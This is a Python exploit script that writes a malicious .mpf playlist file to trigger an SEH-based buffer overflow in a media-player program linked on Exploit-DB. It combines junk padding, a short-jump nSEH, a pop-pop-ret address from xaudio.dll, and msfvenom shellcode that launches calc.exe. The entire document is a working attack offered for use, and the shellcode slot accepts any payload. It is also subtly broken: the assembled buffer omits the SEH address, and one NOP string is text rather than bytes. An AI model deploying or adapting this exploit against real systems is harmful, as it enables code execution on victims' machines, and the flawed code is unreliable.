from struct import pack

# https://www.exploit-db.com/apps/3c35dc3d6067fcc50f118500eb116c0b-millennium1.exe

size = 4600

name = "exploit.mpf"

junk = b"A" * 4112

nseh = b"\xeb\x1e\x90\x90"

seh = pack("<I",0x1002083D) # findjmp.exe xaudio.dll esi

nops = "\x90" * 24

# msfvenom -p windows/exec CMD=calc.exe -f python -v shellcode -b '\x00'
shellcode = b""
shellcode += b"\xda\xd5\xbf\xec\x11\x17\x21\xd9\x74\x24\xf4"
shellcode += b"\x5b\x33\xc9\xb1\x31\x83\xeb\xfc\x31\x7b\x14"
shellcode += b"\x03\x7b\xf8\x73\x52\xdd\x7e\xf1\x5f\xfc\x79"
shellcode += b"\x96\x84\xfb\x96\xf2\x88\xe8\x17\x15\x7a\x3c"
shellcode += b"\x17\xc4\x2e\xd5\xac\xaf\xf9\xda\x25\x9a\x29"
shellcode += b"\xa5\xb7\xaa\x08\xb5\xc4\xe5\x56\x96\x5c\x15"
shellcode += b"\x8b\xeb\x98\x48\x66\x9f\x31\x06\xd4\x8f\x36"
shellcode += b"\xd2\x65\xb6\x75\x05\xe5\xc2\x70\x98\xbe\x95"
shellcode += b"\xcb\x7b\x40\x14\x1f\xf0\x49\x3e\x3c\xdd\x03"
shellcode += b"\xb5\x94\x69\xc6\x1c\x95\xae\x77\x5d\x1a\x5d"
shellcode += b"\x89\xa5\x9d\xbd\xfc\xdc\xdd\x43\xfb\x1a\x9f"
shellcode += b"\x4d\x8e\x99\x27\x18\x08\x45\xd9\xcd\x9f\x0e"
shellcode += b"\xd6\x9a\xeb\x49\xfa\x1f\x28\xe2\x06\xab\xcf"
shellcode += b"\x25\x8f\xef\xeb\xe1\xcb\xb4\x92\xb0\xb1\x1b"
shellcode += b"\x93\xa2\x1a\xc7\x31\xa8\xb7\x14\x48\x6a\xde"
shellcode += b"\x96\xd5\x32\xe0\xb9\x66\x39\x67\xbe\x78\x40"
shellcode += b"\x66\x49\xc4\xdf\xdf\x39\x2f\x8a\xac\xe7\x9d"
shellcode += b"\xe9\xca\x8f\xdd\x5b\x53\x2a\xb6\x98\x6e\xbb"
shellcode += b"\x9d\x58\x99\xa0\x94\x14\xda\xa8\xec\x2a\xfd"
shellcode += b"\x4a\xf5\xaa\xed\x78\xb5\x01\x81\xf1\x5c\xc8"
shellcode += b"\x3e\x53\x7f\xcc\xbb\xe3\xff\x53\x3b\x86\xf9"
shellcode += b"\x53\x4b\x79\x10\x71\x3c\xf6\x61\xc6\x33\xf4"
shellcode += b"\x9e\x8e\x53\x11\x98\xe8\xcb\x76\xb4\x68\xe7"
shellcode += b"\xf7\x47\x62\xb0\x2a\x1f\x35\x76\x9d\x1e\x63"
shellcode += b"\x73\x7a\xb8\xb6\x2d\xd5\x76\x61\xb0\x4e\xf3"
shellcode += b"\x0c\xe2\xbb\xd2\x32\xf5\xe7\xb2\x9f\x85\x1f"
shellcode += b"\x1b\x14\xb7\x1f\x12\xef\x2b\x53\xfa\x24\xac"
shellcode += b"\x9e\xb6\xc3\xe7\xf2\xfa\x1d\x99\xe2\x9d\x9d"
shellcode += b"\xdb\x92"

nops2 = b"\x90" * (size - len(junk + nseh + seh + nops + shellcode))

buffer = junk + nseh + nops + shellcode + nops2

with open(name, 'wb') as archive:
    archive.write(buffer)

print("MPF file Created!")

